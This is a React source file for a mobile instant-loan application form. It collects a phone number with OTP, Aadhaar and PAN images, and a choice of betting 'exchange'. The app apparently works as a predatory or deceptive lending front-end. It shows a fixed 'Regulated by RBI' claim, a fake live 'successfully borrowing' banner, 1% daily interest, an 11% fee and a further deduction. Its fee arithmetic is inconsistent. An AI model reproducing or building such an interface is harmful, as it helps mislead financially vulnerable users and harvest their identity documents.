import React, { useState, useRef, useEffect } from "react";
import { useDispatch, useSelector } from "react-redux";
import Navbar from "./Navbar";
import MobileTabs from "./MobileTabs";

import {
  sendOtpThunk,
  verifyOtpThunk,
  applyLoanThunk,
  checkLoanStatusThunk,
  resetLoanFlow,
} from "../Store/Slice/loanFlowSlice";

/* ===================== MAIN ===================== */
const LoanApplicationForm = () => {
  const dispatch = useDispatch();

  const {
    otpSent,
    loanSubmitted,
    loanStatus,
    statusResult,

    sendingOtp,
    verifyingOtp,
    loading,
    error,
  } = useSelector((s) => s.loanFlow);

  const [step, setStep] = useState(1);
  const [showRestartPopup, setShowRestartPopup] = useState(false);

  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    phone: "",
    otp: ["", "", "", ""],
    amount: 50000,
    aadhaarFront: null,
    aadhaarBack: null,
    panNumber: "",
    panFile: null,
    bookType: "",
  });

  const otpRefs = useRef([]);

  /* ================= OTP INPUT ================= */
  const handleOtpChange = (value, index) => {
    if (!/^\d?$/.test(value)) return;
    const otp = [...formData.otp];
    otp[index] = value;
    setFormData({ ...formData, otp });
    if (value && index < 3) otpRefs.current[index + 1]?.focus();
  };

  /* ================= SEND OTP ================= */
  const sendOtp = () => {
    if (!/^[6-9]\d{9}$/.test(formData.phone)) {
      alert("Invalid phone number");
      return;
    }
    dispatch(sendOtpThunk(formData.phone));
  };

  /* ================= VERIFY OTP ================= */
  const verifyOtp = () => {
    const code = formData.otp.join("");
    dispatch(
      verifyOtpThunk({
        phone: formData.phone,
        code,
      })
    )
      .unwrap()
      .then(() => setStep(2));
  };

  /* ================= APPLY LOAN ================= */
  const submitLoan = () => {
    const fd = new FormData();
    Object.keys(formData).forEach((key) => {
      if (formData[key]) fd.append(key, formData[key]);
    });
    dispatch(applyLoanThunk(fd));
  };

  /* ================= POLLING (AUTO STOP) ================= */
  useEffect(() => {
    if (!loanSubmitted || loanStatus !== "PENDING") return;

    const timer = setInterval(() => {
      dispatch(checkLoanStatusThunk(formData.phone));
    }, 5000);

    return () => clearInterval(timer);
  }, [loanSubmitted, loanStatus, dispatch, formData.phone]);

  /* ================= RESTART POPUP TRIGGER ================= */
  useEffect(() => {
    if (loanStatus === "RESTART" && statusResult) {
      setShowRestartPopup(true);
    }
  }, [loanStatus, statusResult]);

  /* ================= RESTART HANDLER ================= */
  const handleRestartForm = () => {
    setShowRestartPopup(false);
    setStep(1);

    setFormData({
      firstName: "",
      lastName: "",
      phone: "",
      otp: ["", "", "", ""],
      amount: 50000,
      aadhaarFront: null,
      aadhaarBack: null,
      panNumber: "",
      panFile: null,
      bookType: "",
    });

    dispatch(resetLoanFlow());
  };

  /* ================= UI ================= */
  return (
    <>
      <Navbar />

      <div className="min-h-screen bg-[#f5f6fa] flex justify-center px-3 pt-20">
        <div className="w-full max-w-sm bg-white rounded-3xl shadow-lg overflow-hidden">

          <Header />
          <AmountCard amount={formData.amount} />
          <LoanSteps step={step} />

          <div className="px-4 mt-4 space-y-3">

            {/* LOAN SUBMIT LOADER */}
            {loading && step === 3 && (
              <StepLoader text="Submitting loan..." />
            )}

            {/* STEP 1 */}
            {!loading && step === 1 && (
              <StepOne
                formData={formData}
                setFormData={setFormData}
                sendOtp={sendOtp}
                sendingOtp={sendingOtp}
                otpSent={otpSent}
                otpRefs={otpRefs}
                handleOtpChange={handleOtpChange}
                verifyOtp={verifyOtp}
                verifyingOtp={verifyingOtp}
              />
            )}

            {/* STEP 2 */}
            {!loading && step === 2 && (
              <StepTwo
                formData={formData}
                setFormData={setFormData}
                onBack={() => setStep(1)}
                onNext={() => setStep(3)}
              />
            )}

            {/* STEP 3 */}
            {!loading && step === 3 && (
              <StepThree
                formData={formData}
                setFormData={setFormData}
                onBack={() => setStep(2)}
                onSubmit={submitLoan}
              />
            )}

            {/* ADMIN PENDING */}
            {loanSubmitted && loanStatus === "PENDING" && <FinalLoader />}

            {/* APPROVED */}
            {loanStatus === "APPROVED" && statusResult && (
              <StepFour
                loanData={statusResult}
                phone={formData.phone}
              />
            )}

            {/* REJECTED */}
            {loanStatus === "REJECTED" && (
              <div className="p-4 text-center">
                <h2 className="text-red-600 font-bold text-lg">
                  ❌ Loan Rejected
                </h2>
                <p className="text-sm mt-2">
                  Your loan was rejected by admin.
                </p>
              </div>
            )}

            {error && (
              <p className="text-center text-red-500 text-xs">{error}</p>
            )}
          </div>

          <Footer />
        </div>

        <MobileTabs />
        <GlobalStyles />
      </div>

      {/* 🔥 RESTART POPUP */}
      <RestartModal
        open={showRestartPopup}
        message={statusResult?.message}
        reasons={statusResult?.restartReasons}
        onRestart={handleRestartForm}
        onClose={() => setShowRestartPopup(false)}
      />
    </>
  );
};

export default LoanApplicationForm;



/* ===================== STEP 1 ===================== */
const StepOne = ({
  formData,
  setFormData,
  sendOtp,
  sendingOtp,
  otpSent,
  otpRefs,
  handleOtpChange,
  verifyOtp,
  verifyingOtp,
}) => {
  const otpValid = formData.otp.join("").length === 4;

  return (
    <div className="space-y-4">
      <Input label="First Name" onChange={(e) => setFormData({ ...formData, firstName: e.target.value })} />
      <Input label="Last Name" onChange={(e) => setFormData({ ...formData, lastName: e.target.value })} />
      <Input label="Phone Number" maxLength={10} onChange={(e) => setFormData({ ...formData, phone: e.target.value })} />

      <button
        onClick={sendOtp}
        className="btn-primary w-full"
        disabled={sendingOtp}
      >
        {sendingOtp ? "Sending OTP..." : otpSent ? "Resend OTP" : "Send OTP"}
      </button>

      {otpSent && (
        <>
          <div className="flex justify-center gap-2">
            {formData.otp.map((_, i) => (
              <input
                key={i}
                ref={(el) => (otpRefs.current[i] = el)}
                className="otp-box"
                maxLength={1}
                onChange={(e) => handleOtpChange(e.target.value, i)}
              />
            ))}
          </div>

          <button
            disabled={!otpValid || verifyingOtp}
            onClick={verifyOtp}
            className="btn-success w-full"
          >
            {verifyingOtp ? "Verifying..." : "Continue"}
          </button>
        </>
      )}
    </div>
  );
};


/* ===================== HEADER ===================== */
const Header = () => (
  <div className="px-5 pt-5">
    <h2 className="text-lg font-semibold text-gray-700">Welcome!</h2>
    <h1 className="text-xl font-bold">Sawariya Seth</h1>
  </div>
);

/* ===================== AMOUNT CARD ===================== */
const AmountCard = ({ amount }) => (
  <div className="mx-4 mt-4 bg-[#f8f9fb] rounded-2xl p-5 text-center">
    <h2 className="text-3xl font-extrabold">₹{amount.toLocaleString()}</h2>
    <button className="mt-4 w-full bg-red-500 text-white font-semibold py-2 rounded-full">
      Get My Loan
    </button>
  </div>
);

/* ===================== STEP INDICATOR (3 STEPS ONLY) ===================== */
const LoanSteps = ({ step }) => (
  <div className="mx-4 mt-4 bg-white rounded-xl border p-4">
    <h4 className="text-sm font-semibold mb-3">Loan in 3 steps</h4>
    <div className="flex justify-between text-xs">
      {["Basic", "Verify", "Exchange"].map((t, i) => (
        <span
          key={i}
          className={step === i + 1 ? "text-red-500 font-bold" : ""}
        >
          Step {i + 1}<br />{t}
        </span>
      ))}
    </div>
  </div>
);

/* ===================== STEP 1 ===================== */


/* ===================== STEP 2 ===================== */
const StepTwo = ({ formData, setFormData, onBack, onNext }) => {
  const PAN_SCORE_KEY = "pan_score_value";
  const [panScore, setPanScore] = useState(null);

  /* 🔹 LOAD PAN SCORE FROM LOCALSTORAGE (ONCE) */
  useEffect(() => {
    const savedScore = localStorage.getItem(PAN_SCORE_KEY);
    if (savedScore) {
      setPanScore(Number(savedScore));
    }
  }, []);

 

  return (
    <div className="space-y-4">

      {/* LOAN AMOUNT */}
      <div>
        <label className="label">Loan Amount</label>
        <p className="font-semibold text-blue-700">
          ₹ {formData.amount.toLocaleString()}
        </p>
        <input
          type="range"
          min="10000"
          max="50000"
          step="1000"
          value={formData.amount}
          onChange={(e) =>
            setFormData({ ...formData, amount: Number(e.target.value) })
          }
          className="w-full"
        />
      </div>

      {/* AADHAAR */}
      <FileInput
        label="Aadhar Front"
        onChange={(e) =>
          setFormData({ ...formData, aadhaarFront: e.target.files[0] })
        }
      />

      <FileInput
        label="Aadhar Back"
        onChange={(e) =>
          setFormData({ ...formData, aadhaarBack: e.target.files[0] })
        }
      />

      {/* PAN NUMBER */}
      <Input
        label="PAN Number (600+ credit score is mandatory)"
        placeholder="ABCDE1234F"
        value={formData.panNumber}
        onChange={(e) =>
          setFormData({
            ...formData,
            panNumber: e.target.value
              .toUpperCase()   // ✅ CAPITAL
              .replace(/\s/g, "") // ✅ NO SPACES
          })
        }
      />


     

      {/* PAN FILE */}
      <FileInput
        label="PAN Upload"
        onChange={(e) =>
          setFormData({ ...formData, panFile: e.target.files[0] })
        }
      />

      {/* ACTION BUTTONS */}
      <div className="flex gap-3">
        <button onClick={onBack} className="btn-secondary w-1/2">
          Back
        </button>
        <button
          onClick={onNext}
          className="btn-primary w-1/2"
          disabled={!panScore}
        >
          Continue
        </button>
      </div>
    </div>
  );
};

/* ===================== STEP 3 ===================== */
const StepThree = ({ formData, setFormData, onBack, onSubmit }) => (
  <div className="space-y-4">
    <select
      className="input"
      value={formData.bookType}
      onChange={(e) => setFormData({ ...formData, bookType: e.target.value })}
    >
      <option value="">Select Exchange</option>
      <option>Saffron exchange </option>
      <option>All panel exchange </option>
      <option>Fair Bet7</option>
      
    </select>

    <div className="flex gap-3">
      <button onClick={onBack} className="btn-secondary w-1/2">Back</button>
      <button disabled={!formData.bookType} onClick={onSubmit} className="btn-success w-1/2">
        Submit
      </button>
    </div>
  </div>
);

/* ===================== STEP 4 (FINAL) ===================== */
const StepFour = ({ loanData, phone }) => {
  const loanAmount = loanData?.amountRequested || 0;

  const days = 100;
  const dailyInterestRate = 0.01; // 1% daily

  const totalInterest = Math.round(loanAmount * dailyInterestRate * days);
  const totalPayable = loanAmount;
  const dailyEmi = Math.round(totalPayable / days);

  const processingFee = Math.round((loanAmount * 11) / 100);
  const interestGST = Math.round((loanAmount * 5) / 100);
  const netCredit = Math.round(loanAmount - interestGST);

  const maskedPhone = phone
    ? phone.replace(/^(\d{2})\d{6}(\d{2})$/, "$1******$2")
    : "9X******XX";

  return (
    <div className="p-4">

      {/* 🔊 LIVE MESSAGE */}
      <div className="bg-red-100 rounded-xl p-3 text-xs text-center mb-4">
        🔊 {maskedPhone} successfully borrowing ₹{loanAmount.toLocaleString()}
      </div>

      {/* LOAN DETAILS */}
      <div className="bg-white border rounded-xl p-4 space-y-2">
        <Row label="Loan Amount" value={`₹${loanAmount.toLocaleString()}`} />
        <Row label="Loan Term" value={`${days} Days`} />
        <Row
          label="Daily EMI (1% Interest)"
          value={`₹${dailyEmi.toLocaleString()}`}
        />
        <Row
          label="Total Interest (100 Days)"
          value={`₹${totalInterest.toLocaleString()}`}
          red
        />
        <Row
          label="Processing Fee (11%)"
          value={`₹${processingFee.toLocaleString()}`}
          red
        />
      </div>

      {/* USER INFO MESSAGE */}
      <div className="mt-4 bg-yellow-50 border border-yellow-300 rounded-xl p-3 text-xs text-center">
        ✅ Aapke selected amount ka <b>5%</b> deduction ke baad
        <br />
        <b>₹{netCredit.toLocaleString()}</b> aapke account me transfer kiya jayega.
      </div>

      <button className="mt-5 w-full bg-red-500 text-white py-3 rounded-full font-bold">
        Withdraw Now
      </button>
    </div>
  );
};

const RestartModal = ({ open, message, reasons, onRestart, onClose }) => {
  if (!open) return null;

  return (
    <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center px-4">
      <div className="bg-white rounded-2xl w-full max-w-sm p-5">

        <h2 className="text-lg font-bold text-red-600 text-center">
          ⚠ Form Restart Required
        </h2>

        <p className="text-sm text-gray-700 mt-3 text-center">
          {message}
        </p>

        <div className="mt-4 bg-gray-50 border rounded-xl p-3">
          <h4 className="text-sm font-semibold mb-2">
            ❌ Restart Reasons
          </h4>
          <ul className="list-disc pl-5 text-xs text-gray-600 space-y-1">
            {reasons?.map((r, i) => (
              <li key={i}>{r}</li>
            ))}
          </ul>
        </div>

        <button
          onClick={onRestart}
          className="mt-5 w-full bg-red-500 text-white py-2 rounded-full font-semibold"
        >
          Restart Form
        </button>

        <button
          onClick={onClose}
          className="mt-2 w-full text-xs text-gray-500"
        >
          Close
        </button>
      </div>
    </div>
  );
};


/* ===================== LOADERS ===================== */
const StepLoader = ({ text }) => (
  <div className="flex flex-col items-center py-8">
    <div className="loader mb-2" />
    <p className="text-xs text-gray-500">{text}</p>
  </div>
);

const FinalLoader = () => (
  <div className="flex flex-col items-center py-12">
    <div className="loader-lg mb-3" />
    <p className="text-sm text-gray-500">Processing your loan...</p>
  </div>
);

/* ===================== COMMON ===================== */
const Row = ({ label, value, red }) => (
  <div className="flex justify-between text-sm">
    <span>{label}</span>
    <span className={red ? "text-red-500 font-semibold" : "font-semibold"}>
      {value}
    </span>
  </div>
);

const Input = ({ label, ...props }) => (
  <div>
    <label className="label">{label}</label>
    <input className="input" {...props} />
  </div>
);

const FileInput = ({ label, ...props }) => (
  <div>
    <label className="label">{label}</label>
    <input type="file" className="input" {...props} />
  </div>
);

const Footer = () => (
  <div className="text-center text-[10px] text-gray-400 mt-6 pb-4">
    Regulated by RBI · SSA Finserv Pvt Ltd
  </div>
);

/* ===================== STYLES ===================== */
const GlobalStyles = () => (
  <style>{`
    .label { font-size: 12px; font-weight: 600; }
    .input { width:100%; padding:.7rem; border:1px solid #d1d5db; border-radius:.7rem; }
    .btn-primary { background:#ef4444; color:#fff; padding:.7rem; border-radius:.7rem; font-weight:600; }
    .btn-secondary { background:#e5e7eb; padding:.7rem; border-radius:.7rem; }
    .btn-success { background:#22c55e; color:#fff; padding:.7rem; border-radius:.7rem; font-weight:600; }
    .otp-box { width:3rem; height:3rem; text-align:center; border-radius:.6rem; border:1px solid #d1d5db; }
    .loader { width:32px; height:32px; border:4px solid #e5e7eb; border-top:4px solid #ef4444; border-radius:50%; animation:spin 1s linear infinite; }
    .loader-lg { width:48px; height:48px; border:5px solid #e5e7eb; border-top:5px solid #ef4444; border-radius:50%; animation:spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
  `}</style>
);


